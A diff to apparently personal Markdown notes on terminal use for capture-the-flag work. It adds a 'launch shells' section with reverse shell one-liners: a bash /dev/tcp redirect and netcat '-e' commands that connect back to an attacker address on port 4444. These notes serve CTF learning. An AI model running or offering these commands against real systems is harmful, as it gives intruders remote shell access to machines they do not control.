@@ -49,6 +49,13 @@ Strings will print human readable chars of a file. And for a CTF if we are looki
 - `Home` - Go to the begining of your prompt 
 - `End` - Go to the end of your prompt
 
+## Launch shells from a terminal
+
+- Say we have a way through root and we need to get a reverse shell here are helpfuls command
+  - `echo '/bin/bash -i >& /dev/tcp/IP-OF-YOUR-KALI/4444 0>&1'
+  - `nc 10.10.14.11 4444 –e /bin/bash`
+  - `nc 10.10.14.11 4444 –e /bin/sh`
+
 ## Resources
 
 {% embed url="https://askubuntu.com/questions/470966/shortcut-to-clear-command-line-terminal" %} Shortcut to clear command line terminal {% endembed %}
